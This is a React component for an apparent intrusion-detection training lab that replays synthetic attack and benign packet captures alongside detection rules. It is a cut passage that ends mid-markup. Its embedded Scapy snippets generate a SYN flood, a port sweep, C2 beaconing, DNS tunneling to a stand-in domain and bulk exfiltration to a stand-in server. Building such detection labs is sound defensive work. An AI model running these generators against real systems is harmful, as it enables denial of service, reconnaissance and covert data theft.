import React, { useState, useEffect, useRef } from 'react';
import { 
  Play, 
  Pause, 
  RotateCcw, 
  SkipForward, 
  Upload, 
  ShieldCheck, 
  Radio, 
  Cpu, 
  Layers, 
  FileCode, 
  Download, 
  AlertTriangle, 
  CheckCircle2, 
  HelpCircle,
  Activity,
  Sliders,
  Database,
  Eye,
  Server,
  Terminal,
  Zap,
  Lock,
  ArrowRight
} from 'lucide-react';
import { ThreatLabel, SeverityLevel } from '../types';

interface PacketItem {
  id: number;
  timestamp: number;
  rel_time: number;
  src_ip: string;
  src_port: number;
  dst_ip: string;
  dst_port: number;
  proto: 'TCP' | 'UDP' | 'ICMP' | 'DNS' | 'TLS';
  length: number;
  flags: string[];
  payload_entropy: number;
  direction: 'FWD' | 'REV';
  info: string;
}

interface ScenarioPCAP {
  id: string;
  name: string;
  filename: string;
  threatClass: ThreatLabel;
  categoryTitle: string;
  description: string;
  severity: SeverityLevel;
  targetVictim: string;
  attacker: string;
  scapyGeneratorSnippet: string;
  packets: PacketItem[];
}

const PRESET_SCENARIOS: ScenarioPCAP[] = [
  {
    id: 'ddos_syn',
    name: 'Volumetric & Protocol DDoS (SYN Flood)',
    filename: 'syn_flood_volumetric_ddos.pcap',
    threatClass: 'ddos',
    categoryTitle: 'Volumetric and Protocol DDoS',
    description: 'High-frequency unidirectional SYN flood exhausting TCP half-open connection queues without waiting for SYN-ACK.',
    severity: 'CRITICAL',
    targetVictim: '192.168.1.100:80',
    attacker: '10.0.0.45:dynamic',
    scapyGeneratorSnippet: `from scapy.all import IP, TCP, send\n# Unidirectional SYN flood with randomized source ports\npkts = [IP(src="10.0.0.45", dst="192.168.1.100")/TCP(sport=1024+i, dport=80, flags="S") for i in range(5000)]\n# Zero return traffic expected on optical diode\nsend(pkts, iface="eth0", verbose=0)`,
    packets: [
      { id: 1, timestamp: 1718000000.010, rel_time: 0.010, src_ip: '10.0.0.45', src_port: 48201, dst_ip: '192.168.1.100', dst_port: 80, proto: 'TCP', length: 64, flags: ['SYN'], payload_entropy: 0.12, direction: 'FWD', info: '48201 → 80 [SYN] Seq=0 Win=65535' },
      { id: 2, timestamp: 1718000000.014, rel_time: 0.014, src_ip: '10.0.0.45', src_port: 48202, dst_ip: '192.168.1.100', dst_port: 80, proto: 'TCP', length: 64, flags: ['SYN'], payload_entropy: 0.15, direction: 'FWD', info: '48202 → 80 [SYN] Seq=0 Win=65535' },
      { id: 3, timestamp: 1718000000.018, rel_time: 0.018, src_ip: '10.0.0.45', src_port: 48203, dst_ip: '192.168.1.100', dst_port: 80, proto: 'TCP', length: 64, flags: ['SYN'], payload_entropy: 0.11, direction: 'FWD', info: '48203 → 80 [SYN] Seq=0 Win=65535' },
      { id: 4, timestamp: 1718000000.021, rel_time: 0.021, src_ip: '10.0.0.45', src_port: 48204, dst_ip: '192.168.1.100', dst_port: 80, proto: 'TCP', length: 64, flags: ['SYN'], payload_entropy: 0.18, direction: 'FWD', info: '48204 → 80 [SYN] Seq=0 Win=65535' },
      { id: 5, timestamp: 1718000000.025, rel_time: 0.025, src_ip: '10.0.0.45', src_port: 48205, dst_ip: '192.168.1.100', dst_port: 80, proto: 'TCP', length: 64, flags: ['SYN'], payload_entropy: 0.10, direction: 'FWD', info: '48205 → 80 [SYN] Seq=0 Win=65535' },
      { id: 6, timestamp: 1718000000.029, rel_time: 0.029, src_ip: '10.0.0.45', src_port: 48206, dst_ip: '192.168.1.100', dst_port: 80, proto: 'TCP', length: 64, flags: ['SYN'], payload_entropy: 0.14, direction: 'FWD', info: '48206 → 80 [SYN] Seq=0 Win=65535' },
      { id: 7, timestamp: 1718000000.033, rel_time: 0.033, src_ip: '10.0.0.45', src_port: 48207, dst_ip: '192.168.1.100', dst_port: 80, proto: 'TCP', length: 64, flags: ['SYN'], payload_entropy: 0.12, direction: 'FWD', info: '48207 → 80 [SYN] Seq=0 Win=65535' },
      { id: 8, timestamp: 1718000000.037, rel_time: 0.037, src_ip: '10.0.0.45', src_port: 48208, dst_ip: '192.168.1.100', dst_port: 80, proto: 'TCP', length: 64, flags: ['SYN'], payload_entropy: 0.16, direction: 'FWD', info: '48208 → 80 [SYN] Seq=0 Win=65535' },
    ]
  },
  {
    id: 'port_scan',
    name: 'Reconnaissance & Port Scanning (SYN Sweep)',
    filename: 'horizontal_syn_portscan.pcap',
    threatClass: 'port_scan',
    categoryTitle: 'Reconnaissance & Port Scanning',
    description: 'Horizontal reconnaissance probing ports 21, 22, 23, 80, 443, 8080 without payload or completed handshake.',
    severity: 'LOW',
    targetVictim: '192.168.1.250:[Multiple Ports]',
    attacker: '192.168.1.55:54321',
    scapyGeneratorSnippet: `from scapy.all import IP, TCP, sr1\nports = [21, 22, 23, 80, 443, 8080, 3389]\nfor p in ports:\n    pkt = IP(dst="192.168.1.250")/TCP(dport=p, flags="S")\n    send(pkt, verbose=0)`,
    packets: [
      { id: 1, timestamp: 1718000010.100, rel_time: 0.100, src_ip: '192.168.1.55', src_port: 54321, dst_ip: '192.168.1.250', dst_port: 21, proto: 'TCP', length: 54, flags: ['SYN'], payload_entropy: 0.00, direction: 'FWD', info: '54321 → 21 (FTP) [SYN] Probe' },
      { id: 2, timestamp: 1718000010.150, rel_time: 0.150, src_ip: '192.168.1.55', src_port: 54321, dst_ip: '192.168.1.250', dst_port: 22, proto: 'TCP', length: 54, flags: ['SYN'], payload_entropy: 0.00, direction: 'FWD', info: '54321 → 22 (SSH) [SYN] Probe' },
      { id: 3, timestamp: 1718000010.200, rel_time: 0.200, src_ip: '192.168.1.55', src_port: 54321, dst_ip: '192.168.1.250', dst_port: 23, proto: 'TCP', length: 54, flags: ['SYN'], payload_entropy: 0.00, direction: 'FWD', info: '54321 → 23 (Telnet) [SYN] Probe' },
      { id: 4, timestamp: 1718000010.250, rel_time: 0.250, src_ip: '192.168.1.55', src_port: 54321, dst_ip: '192.168.1.250', dst_port: 80, proto: 'TCP', length: 54, flags: ['SYN'], payload_entropy: 0.00, direction: 'FWD', info: '54321 → 80 (HTTP) [SYN] Probe' },
      { id: 5, timestamp: 1718000010.300, rel_time: 0.300, src_ip: '192.168.1.55', src_port: 54321, dst_ip: '192.168.1.250', dst_port: 443, proto: 'TCP', length: 54, flags: ['SYN'], payload_entropy: 0.00, direction: 'FWD', info: '54321 → 443 (HTTPS) [SYN] Probe' },
      { id: 6, timestamp: 1718000010.350, rel_time: 0.350, src_ip: '192.168.1.55', src_port: 54321, dst_ip: '192.168.1.250', dst_port: 8080, proto: 'TCP', length: 54, flags: ['SYN'], payload_entropy: 0.00, direction: 'FWD', info: '54321 → 8080 [SYN] Probe' },
    ]
  },
  {
    id: 'c2_beacon',
    name: 'Botnet Command & Control (Cobalt Strike Beacon)',
    filename: 'cobalt_strike_malleable_c2.pcap',
    threatClass: 'c2_beacon',
    categoryTitle: 'Botnet C2 Beaconing',
    description: 'Periodic, low-volume communication to external C2 node with robotic timing regularity (IAT CV < 0.18).',
    severity: 'HIGH',
    targetVictim: '185.220.101.5:443 (External C2)',
    attacker: '192.168.1.42:51280 (Compromised Host)',
    scapyGeneratorSnippet: `import time\nfrom scapy.all import IP, TCP, Raw, send\n# Cobalt strike heartbeat every 5.0 seconds\nfor _ in range(10):\n    pkt = IP(src="192.168.1.42", dst="185.220.101.5")/TCP(sport=51280, dport=443, flags="PA")/Raw(load=b"HEARTBEAT_DATA")\n    send(pkt, verbose=0)\n    time.sleep(5.00) # strict periodicity`,
    packets: [
      { id: 1, timestamp: 1718000020.000, rel_time: 0.000, src_ip: '192.168.1.42', src_port: 51280, dst_ip: '185.220.101.5', dst_port: 443, proto: 'TCP', length: 180, flags: ['PSH', 'ACK'], payload_entropy: 5.42, direction: 'FWD', info: '51280 → 443 [PSH, ACK] Beacon #1 (len=180)' },
      { id: 2, timestamp: 1718000025.002, rel_time: 5.002, src_ip: '192.168.1.42', src_port: 51280, dst_ip: '185.220.101.5', dst_port: 443, proto: 'TCP', length: 180, flags: ['PSH', 'ACK'], payload_entropy: 5.40, direction: 'FWD', info: '51280 → 443 [PSH, ACK] Beacon #2 (Δt=5.002s)' },
      { id: 3, timestamp: 1718000030.005, rel_time: 10.005, src_ip: '192.168.1.42', src_port: 51280, dst_ip: '185.220.101.5', dst_port: 443, proto: 'TCP', length: 180, flags: ['PSH', 'ACK'], payload_entropy: 5.43, direction: 'FWD', info: '51280 → 443 [PSH, ACK] Beacon #3 (Δt=5.003s)' },
      { id: 4, timestamp: 1718000035.001, rel_time: 15.001, src_ip: '192.168.1.42', src_port: 51280, dst_ip: '185.220.101.5', dst_port: 443, proto: 'TCP', length: 180, flags: ['PSH', 'ACK'], payload_entropy: 5.41, direction: 'FWD', info: '51280 → 443 [PSH, ACK] Beacon #4 (Δt=4.996s)' },
      { id: 5, timestamp: 1718000040.004, rel_time: 20.004, src_ip: '192.168.1.42', src_port: 51280, dst_ip: '185.220.101.5', dst_port: 443, proto: 'TCP', length: 180, flags: ['PSH', 'ACK'], payload_entropy: 5.42, direction: 'FWD', info: '51280 → 443 [PSH, ACK] Beacon #5 (Δt=5.003s)' },
    ]
  },
  {
    id: 'dns_tunnel',
    name: 'DNS-Based Anomaly & Tunneling (Base64 Exfiltration)',
    filename: 'dga_dns_tunnel_base64.pcap',
    threatClass: 'dns_anomaly',
    categoryTitle: 'DNS-Based Anomalies (DGA / Tunneling)',
    description: 'Covert channel embedding base64 encoded data into high-entropy DNS subdomains (>3.4 bits, QNAME > 28 chars).',
    severity: 'HIGH',
    targetVictim: '8.8.8.8:53 (Recursive Resolver)',
    attacker: '192.168.1.18:59124',
    scapyGeneratorSnippet: `from scapy.all import IP, UDP, DNS, DNSQR, send\n# DNS tunneling with base64 payload in QNAME\nsubdomains = [\n    "a8f9c1b2e4d588a.c2.tunnel.net",\n    "99b82fa01ec47bd.c2.tunnel.net",\n    "e71c998bf024aa3.c2.tunnel.net"\n]\nfor q in subdomains:\n    pkt = IP(dst="8.8.8.8")/UDP(sport=59124, dport=53)/DNS(rd=1, qd=DNSQR(qname=q, qtype="TXT"))\n    send(pkt, verbose=0)`,
    packets: [
      { id: 1, timestamp: 1718000050.100, rel_time: 0.100, src_ip: '192.168.1.18', src_port: 59124, dst_ip: '8.8.8.8', dst_port: 53, proto: 'DNS', length: 94, flags: [], payload_entropy: 3.52, direction: 'FWD', info: 'DNS Query TXT a8f9c1b2e4d588a.c2.tunnel.net' },
      { id: 2, timestamp: 1718000050.450, rel_time: 0.450, src_ip: '192.168.1.18', src_port: 59124, dst_ip: '8.8.8.8', dst_port: 53, proto: 'DNS', length: 98, flags: [], payload_entropy: 3.65, direction: 'FWD', info: 'DNS Query TXT 99b82fa01ec47bd.c2.tunnel.net' },
      { id: 3, timestamp: 1718000050.800, rel_time: 0.800, src_ip: '192.168.1.18', src_port: 59124, dst_ip: '8.8.8.8', dst_port: 53, proto: 'DNS', length: 92, flags: [], payload_entropy: 3.48, direction: 'FWD', info: 'DNS Query TXT e71c998bf024aa3.c2.tunnel.net' },
      { id: 4, timestamp: 1718000051.150, rel_time: 1.150, src_ip: '192.168.1.18', src_port: 59124, dst_ip: '8.8.8.8', dst_port: 53, proto: 'DNS', length: 96, flags: [], payload_entropy: 3.58, direction: 'FWD', info: 'DNS Query TXT f014ba389ce1d22.c2.tunnel.net' },
    ]
  },
  {
    id: 'encrypted_tor',
    name: 'Suspicious Encrypted Session (Tor JA3 & Record Length Anomaly)',
    filename: 'suspicious_encrypted_tor_ja3.pcap',
    threatClass: 'encrypted_anomaly',
    categoryTitle: 'Suspicious Encrypted Sessions',
    description: 'TLS session exhibiting anomalous record length distribution and known Tor/malware JA3 fingerprint without decryption.',
    severity: 'HIGH',
    targetVictim: '198.51.100.77:443',
    attacker: '192.168.1.77:49812',
    scapyGeneratorSnippet: `from scapy.all import IP, TCP, Raw, send\n# TLS Client Hello with anomalous JA3 fingerprint (Tor client)\ntls_hello = bytes.fromhex("16030100f8010000f40303...")\npkt = IP(src="192.168.1.77", dst="198.51.100.77")/TCP(sport=49812, dport=443, flags="PA")/Raw(load=tls_hello)\nsend(pkt, verbose=0)`,
    packets: [
      { id: 1, timestamp: 1718000060.010, rel_time: 0.010, src_ip: '192.168.1.77', src_port: 49812, dst_ip: '198.51.100.77', dst_port: 443, proto: 'TLS', length: 517, flags: ['PSH', 'ACK'], payload_entropy: 7.22, direction: 'FWD', info: 'TLS Client Hello (JA3=a0e9f5d64349fb13191bc781f81f42e1, SNI=hidden.onion)' },
      { id: 2, timestamp: 1718000060.120, rel_time: 0.120, src_ip: '192.168.1.77', src_port: 49812, dst_ip: '198.51.100.77', dst_port: 443, proto: 'TLS', length: 940, flags: ['PSH', 'ACK'], payload_entropy: 7.45, direction: 'FWD', info: 'TLS Application Data (Record Len: 940B, High Entropy)' },
      { id: 3, timestamp: 1718000060.250, rel_time: 0.250, src_ip: '192.168.1.77', src_port: 49812, dst_ip: '198.51.100.77', dst_port: 443, proto: 'TLS', length: 940, flags: ['PSH', 'ACK'], payload_entropy: 7.42, direction: 'FWD', info: 'TLS Application Data (Record Len: 940B, High Entropy)' },
    ]
  },
  {
    id: 'exfiltration',
    name: 'Abnormal Data Exfiltration (Bulk Unidirectional Transfer)',
    filename: 'abnormal_exfiltration_ssh.pcap',
    threatClass: 'exfiltration',
    categoryTitle: 'Abnormal Data Exfiltration',
    description: 'Sustained, unidirectional high-volume outbound transfer (> 15 KB payload, 88% payload ratio) without corresponding reverse acknowledgements.',
    severity: 'CRITICAL',
    targetVictim: '203.0.113.88:22 (Rogue Drop Server)',
    attacker: '192.168.1.105:43881',
    scapyGeneratorSnippet: `from scapy.all import IP, TCP, Raw, send\n# Sustained bulk file transfer to external IP\nchunk = b"A" * 1460\nfor i in range(12):\n    pkt = IP(src="192.168.1.105", dst="203.0.113.88")/TCP(sport=43881, dport=22, flags="PA")/Raw(load=chunk)\n    send(pkt, verbose=0)`,
    packets: [
      { id: 1, timestamp: 1718000070.010, rel_time: 0.010, src_ip: '192.168.1.105', src_port: 43881, dst_ip: '203.0.113.88', dst_port: 22, proto: 'TCP', length: 1514, flags: ['PSH', 'ACK'], payload_entropy: 6.12, direction: 'FWD', info: '43881 → 22 [PSH, ACK] Bulk Data Segment #1 (1460B)' },
      { id: 2, timestamp: 1718000070.015, rel_time: 0.015, src_ip: '192.168.1.105', src_port: 43881, dst_ip: '203.0.113.88', dst_port: 22, proto: 'TCP', length: 1514, flags: ['PSH', 'ACK'], payload_entropy: 6.18, direction: 'FWD', info: '43881 → 22 [PSH, ACK] Bulk Data Segment #2 (1460B)' },
      { id: 3, timestamp: 1718000070.020, rel_time: 0.020, src_ip: '192.168.1.105', src_port: 43881, dst_ip: '203.0.113.88', dst_port: 22, proto: 'TCP', length: 1514, flags: ['PSH', 'ACK'], payload_entropy: 6.14, direction: 'FWD', info: '43881 → 22 [PSH, ACK] Bulk Data Segment #3 (1460B)' },
      { id: 4, timestamp: 1718000070.025, rel_time: 0.025, src_ip: '192.168.1.105', src_port: 43881, dst_ip: '203.0.113.88', dst_port: 22, proto: 'TCP', length: 1514, flags: ['PSH', 'ACK'], payload_entropy: 6.19, direction: 'FWD', info: '43881 → 22 [PSH, ACK] Bulk Data Segment #4 (1460B)' },
      { id: 5, timestamp: 1718000070.030, rel_time: 0.030, src_ip: '192.168.1.105', src_port: 43881, dst_ip: '203.0.113.88', dst_port: 22, proto: 'TCP', length: 1514, flags: ['PSH', 'ACK'], payload_entropy: 6.15, direction: 'FWD', info: '43881 → 22 [PSH, ACK] Bulk Data Segment #5 (1460B)' },
    ]
  },
  {
    id: 'scada_benign',
    name: 'Normal Operational Baseline (SCADA / Enterprise)',
    filename: 'scada_enterprise_benign.pcap',
    threatClass: 'benign',
    categoryTitle: 'Benign Operational Traffic',
    description: 'Modbus telemetry, standard DNS lookups, and internal web browsing with natural human inter-arrival jitter.',
    severity: 'NORMAL',
    targetVictim: '192.168.1.10:502 (SCADA PLC)',
    attacker: '192.168.1.20:50123 (HMI Station)',
    scapyGeneratorSnippet: `from scapy.all import IP, TCP, Raw, send\n# Benign SCADA Modbus polling\npkt = IP(src="192.168.1.20", dst="192.168.1.10")/TCP(sport=50123, dport=502, flags="PA")/Raw(load=b"\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x03\\x00\\x00\\x00\\x0a")\nsend(pkt, verbose=0)`,
    packets: [
      { id: 1, timestamp: 1718000080.050, rel_time: 0.050, src_ip: '192.168.1.20', src_port: 50123, dst_ip: '192.168.1.10', dst_port: 502, proto: 'TCP', length: 78, flags: ['PSH', 'ACK'], payload_entropy: 1.82, direction: 'FWD', info: 'Modbus Read Holding Registers (Unit=1, Count=10)' },
      { id: 2, timestamp: 1718000081.240, rel_time: 1.240, src_ip: '192.168.1.20', src_port: 50123, dst_ip: '192.168.1.10', dst_port: 502, proto: 'TCP', length: 78, flags: ['PSH', 'ACK'], payload_entropy: 1.85, direction: 'FWD', info: 'Modbus Read Holding Registers (Δt=1.19s, Human jitter)' },
      { id: 3, timestamp: 1718000082.890, rel_time: 2.890, src_ip: '192.168.1.20', src_port: 50123, dst_ip: '192.168.1.10', dst_port: 502, proto: 'TCP', length: 78, flags: ['PSH', 'ACK'], payload_entropy: 1.80, direction: 'FWD', info: 'Modbus Read Holding Registers (Δt=1.65s, Human jitter)' },
    ]
  }
];

export const PCAPReplayLabView: React.FC = () => {
  const [selectedScenarioId, setSelectedScenarioId] = useState<string>('ddos_syn');
  const [isPlaying, setIsPlaying] = useState<boolean>(false);
  const [playbackSpeed, setPlaybackSpeed] = useState<number>(1);
  const [currentPacketIdx, setCurrentPacketIdx] = useState<number>(0);
  const [activeTab, setActiveTab] = useState<'replay' | 'features' | 'hybrid_verdict' | 'run_aware'>('replay');
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const scenario = PRESET_SCENARIOS.find(s => s.id === selectedScenarioId) || PRESET_SCENARIOS[0];
  const packets = scenario.packets;
  const currentPacket = packets[currentPacketIdx] || packets[0];

  // Playback timer
  useEffect(() => {
    if (isPlaying) {
      const interval = Math.max(150, 1000 / playbackSpeed);
      timerRef.current = setInterval(() => {
        setCurrentPacketIdx(prev => {
          if (prev >= packets.length - 1) {
            setIsPlaying(false);
            return prev;
          }
          return prev + 1;
        });
      }, interval);
    } else {
      if (timerRef.current) clearInterval(timerRef.current);
    }
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [isPlaying, playbackSpeed, packets.length]);

  const handleScenarioChange = (id: string) => {
    setSelectedScenarioId(id);
    setCurrentPacketIdx(0);
    setIsPlaying(false);
  };

  const handleReset = () => {
    setIsPlaying(false);
    setCurrentPacketIdx(0);
  };

  const handleStepNext = () => {
    setIsPlaying(false);
    setCurrentPacketIdx(prev => Math.min(packets.length - 1, prev + 1));
  };

  // Reconstructed flow metrics up to currentPacketIdx
  const visiblePackets = packets.slice(0, currentPacketIdx + 1);
  const totalPackets = visiblePackets.length;
  const totalBytes = visiblePackets.reduce((acc, p) => acc + p.length, 0);
  const duration = visiblePackets.length > 1 
    ? (visiblePackets[visiblePackets.length - 1].rel_time - visiblePackets[0].rel_time) 
    : 0.05;
  const pps = duration > 0 ? (totalPackets / duration) : totalPackets * 20;
  const bps = duration > 0 ? (totalBytes / duration) : totalBytes * 20;
  const synCount = visiblePackets.filter(p => p.flags.includes('SYN')).length;
  const ackCount = visiblePackets.filter(p => p.flags.includes('ACK')).length;
  const synRatio = totalPackets > 0 ? (synCount / totalPackets) : 0;
  const incompleteHandshake = (synCount > 0 && ackCount === 0) ? 1 : 0;
  const avgPayloadEntropy = (visiblePackets.reduce((acc, p) => acc + p.payload_entropy, 0) / Math.max(1, totalPackets)).toFixed(2);

  // Confidence & Severity calculations (Distinct dimensions per user vision)
  let modelConfidence = 96.4;
  let isolationForestScore = 0.88; // Anomaly component
  let behavioralRule = 'No critical signature triggered';

  if (scenario.threatClass === 'ddos') {
    modelConfidence = 98.7;
    isolationForestScore = 0.96;
    behavioralRule = 'RULE-DDoS-01: SYN_ratio > 0.85 and duration < 2.0s (CONFIRMED FLOOD)';
  } else if (scenario.threatClass === 'port_scan') {
    modelConfidence = 99.1;
    isolationForestScore = 0.82;
    behavioralRule = 'RULE-SCAN-01: Incomplete Handshake with dst_port sweep and 0 payload bytes';
  } else if (scenario.threatClass === 'c2_beacon') {
    modelConfidence = 95.2;
    isolationForestScore = 0.89;
    behavioralRule = 'RULE-C2-01: Inter-Arrival Time CV < 0.20 on persistent TCP/443 port';
  } else if (scenario.threatClass === 'dns_anomaly') {
    modelConfidence = 94.8;
    isolationForestScore = 0.91;
    behavioralRule = 'RULE-DNS-02: QNAME Shannon Entropy > 3.40 bits with TXT covert query';
  } else if (scenario.threatClass === 'encrypted_anomaly') {
    modelConfidence = 92.4;
    isolationForestScore = 0.94;
    behavioralRule = 'RULE-JA3-04: Known Tor/Malware JA3 signature a0e9f5d64349fb13191bc781f81f42e1';
  } else if (scenario.threatClass === 'exfiltration') {
    modelConfidence = 93.6;
    isolationForestScore = 0.95;
    behavioralRule = 'RULE-EXFIL-01: Unidirectional forward byte ratio > 800 B/pkt without reverse traffic';
  } else {
    modelConfidence = 98.9;
    isolationForestScore = 0.08;
    behavioralRule = 'RULE-BENIGN-00: Normal SCADA/enterprise communication patterns';
  }

  return (
    <div className="space-y-6">
      {/* Top Banner: Optical Data Diode & Sensor Status */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-emerald-950 border border-emerald-700/50 flex items-center justify-center text-emerald-400 shrink-0">
            <ShieldCheck className="w-5 h-5" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="px-2 py-0.5 rounded bg-emerald-950 text-emerald-300 text-[10px] font-mono font-bold border border-emerald-800">
                DATA DIODE: PASSIVE (Rx-ONLY)
              </span>
              <span className="text-slate-600">&bull;</span>
              <span className="text-xs font-mono text-slate-300">Outbound TX: <strong className="text-emerald-400">0 PACKETS (BLOCKED)</strong></span>
            </div>
            <h2 className="text-base font-bold text-white mt-0.5">
              PCAP Replay, Ingestion Engine &amp; Feature Dissector
            </h2>
          </div>
        </div>

        {/* Global Controls & Partition Status */}
        <div className="flex flex-wrap items-center gap-3">
          <div className="px-3 py-1 rounded-lg bg-slate-950 border border-slate-800 text-xs font-mono flex items-center gap-2">
            <Radio className="w-3.5 h-3.5 text-sky-400 animate-pulse" />
            <span>Autonomous Timeouts: <strong className="text-white">15s Idle / 30s Active</strong></span>
          </div>

          <div className="px-3 py-1 rounded-lg bg-indigo-950/60 border border-indigo-800/60 text-xs font-mono text-indigo-300 flex items-center gap-1.5">
            <Lock className="w-3.5 h-3.5" />
            <span>Run-Aware Partitions: <strong>ACTIVE</strong></span>
          </div>
        </div>
      </div>

      {/* Scenario Selector Ribbon */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 space-y-3">
        <div className="flex items-center justify-between">
          <div className="text-xs font-mono uppercase text-slate-400 font-bold flex items-center gap-2">
            <Sliders className="w-4 h-4 text-sky-400" />
            <span>Select Ground-Truth PCAP Scenario (Synthetic Scapy Generation):</span>
          </div>
          <span className="text-[11px] text-slate-400 font-mono">
            Ground Truth: <strong className="text-sky-400 uppercase">{scenario.threatClass}</strong>
          </span>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-7 gap-2">
          {PRESET_SCENARIOS.map((sc) => {
            const isSelected = sc.id === selectedScenarioId;
            return (
              <button
                key={sc.id}
                onClick={() => handleScenarioChange(sc.id)}
                className={`p-2.5 rounded-lg border text-left text-xs transition-all cursor-pointer flex flex-col justify-between ${
                  isSelected
                    ? 'bg-sky-950/80 border-sky-500 text-white shadow-md shadow-sky-950'
                    : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-slate-200 hover:border-slate-700'
                }`}
              >
                <div>
                  <div className="text-[10px] font-mono text-sky-400 uppercase font-bold truncate">
                    {sc.threatClass}
                  </div>
                  <div className="font-semibold text-[11px] text-slate-200 line-clamp-1 mt-0.5">
                    {sc.name.split('(')[0]}
                  </div>
                </div>
                <div className="mt-2 pt-1 border-t border-slate-800/80 flex items-center justify-between text-[9px] font-mono">
                  <span className="text-slate-500">{sc.packets.length} pkts</span>
                  <span className={`font-bold ${
                    sc.severity === 'CRITICAL' ? 'text-rose-400' :
                    sc.severity === 'HIGH' ? 'text-amber-400' :
                    sc.severity === 'MEDIUM' ? 'text-indigo-400' :
                    sc.severity === 'LOW' ? 'text-sky-400' : 'text-emerald-400'
                  }`}>
                    {sc.severity}
                  </span>
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Main Interactive Work Area */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Left Column (7 Cols): Replay Player & Scapy Packet Dissector */}
        <div className="lg:col-span-7 space-y-4">
          
          {/* Player Toolbar */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 space-y-3">
            <div className="flex flex-wrap items-center justify-between gap-3">
              {/* Playback Controls */}
              <div className="flex items-center gap-2">
                <button
                  onClick={() => setIsPlaying(!isPlaying)}
                  className={`px-4 py-2 rounded-lg font-bold text-xs flex items-center gap-2 transition-all cursor-pointer ${
                    isPlaying 
                      ? 'bg-amber-600 hover:bg-amber-500 text-white' 
                      : 'bg-sky-600 hover:bg-sky-500 text-white'
                  }`}
                >
                  {isPlaying ? <Pause className="w-4 h-4" /> : <Play className="w-4 h-4" />}
                  <span>{isPlaying ? 'PAUSE REPLAY' : 'REPLAY PCAP'}</span>
                </button>

                <button
                  onClick={handleStepNext}
                  disabled={currentPacketIdx >= packets.length - 1}
                  className="p-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-300 hover:text-white hover:bg-slate-800 disabled:opacity-40 disabled:cursor-not-allowed transition-all cursor-pointer"
                  title="Step 1 Packet Forward"
                >
                  <SkipForward className="w-4 h-4" />
                </button>

                <button
                  onClick={handleReset}
                  className="p-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-300 hover:text-white hover:bg-slate-800 transition-all cursor-pointer"
                  title="Reset Replay"
                >
                  <RotateCcw className="w-4 h-4" />
                </button>
              </div>

              {/* Speed Selector */}
              <div className="flex items-center gap-1.5 text-xs font-mono">
                <span className="text-slate-400">Speed:</span>
                {[0.5, 1, 2, 5, 10].map(s => (
                  <button
                    key={s}
                    onClick={() => setPlaybackSpeed(s)}
                    className={`px-2 py-1 rounded text-[11px] transition-all cursor-pointer ${
                      playbackSpeed === s
                        ? 'bg-sky-600 text-white font-bold'
                        : 'bg-slate-950 text-slate-400 hover:text-white'
                    }`}
                  >
                    {s}x
                  </button>
                ))}
              </div>
            </div>

            {/* Timeline Scrubber */}
            <div className="space-y-1.5 pt-1">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-slate-400">
                  Packet Dissected: <strong className="text-white">{currentPacketIdx + 1}</strong> / {packets.length}
                </span>
                <span className="text-slate-400">
                  Rel Timestamp: <strong className="text-sky-400">+{currentPacket.rel_time.toFixed(3)}s</strong>
                </span>
              </div>
              <input
                type="range"
                min={0}
                max={packets.length - 1}
                value={currentPacketIdx}
                onChange={(e) => {
                  setIsPlaying(false);
                  setCurrentPacketIdx(Number(e.target.value));
                }}
                className="w-full accent-sky-500 cursor-pointer h-1.5 bg-slate-950 rounded-lg appearance-none"
              />
            </div>
          </div>

          {/* Scapy Packet Stream Dissector Table */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden">
            <div className="p-3.5 bg-slate-950 border-b border-slate-800 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4 text-sky-400" />
                <span className="font-bold text-xs text-white font-mono">
                  SCAPY DIRECTION-SENSITIVE 5-TUPLE DISSECTOR ({visiblePackets.length} PACKETS PROCESSED)
                </span>
              </div>
              <span className="text-[10px] font-mono text-emerald-400">
                FWD-ONLY (ZERO RX-TX LOOP)
              </span>
            </div>

            <div className="max-h-[360px] overflow-y-auto scrollbar-thin">
              <table className="w-full text-left text-xs border-collapse font-mono">
                <thead className="bg-slate-950/80 text-slate-400 text-[10px] uppercase sticky top-0 border-b border-slate-800">
                  <tr>
                    <th className="p-2">#</th>
                    <th className="p-2">Time</th>
                    <th className="p-2">Source → Destination</th>
                    <th className="p-2">Proto</th>
                    <th className="p-2">Len</th>
                    <th className="p-2">Flags</th>
                    <th className="p-2">Info</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/80 text-[11px]">
                  {visiblePackets.map((pkt, idx) => {
                    const isLatest = idx === currentPacketIdx;
                    return (
                      <tr 
                        key={pkt.id} 
                        className={`transition-colors ${
                          isLatest 
                            ? 'bg-sky-950/50 text-white font-bold' 
                            : 'hover:bg-slate-800/40 text-slate-300'
                        }`}
                      >
                        <td className="p-2 text-slate-500">{pkt.id}</td>
                        <td className="p-2 text-sky-300 whitespace-nowrap">+{pkt.rel_time.toFixed(3)}s</td>
                        <td className="p-2 whitespace-nowrap">
                          <span className="text-slate-200">{pkt.src_ip}:{pkt.src_port}</span>
                          <span className="text-slate-500 mx-1">→</span>
                          <span className="text-white">{pkt.dst_ip}:{pkt.dst_port}</span>
                        </td>
                        <td className="p-2">
                          <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold ${
                            pkt.proto === 'DNS' ? 'bg-indigo-950 text-indigo-300' :
                            pkt.proto === 'TLS' ? 'bg-purple-950 text-purple-300' :
                            pkt.proto === 'UDP' ? 'bg-amber-950 text-amber-300' : 'bg-sky-950 text-sky-300'
                          }`}>
                            {pkt.proto}
                          </span>
                        </td>
                        <td className="p-2 text-slate-400">{pkt.length}B</td>
                        <td className="p-2">
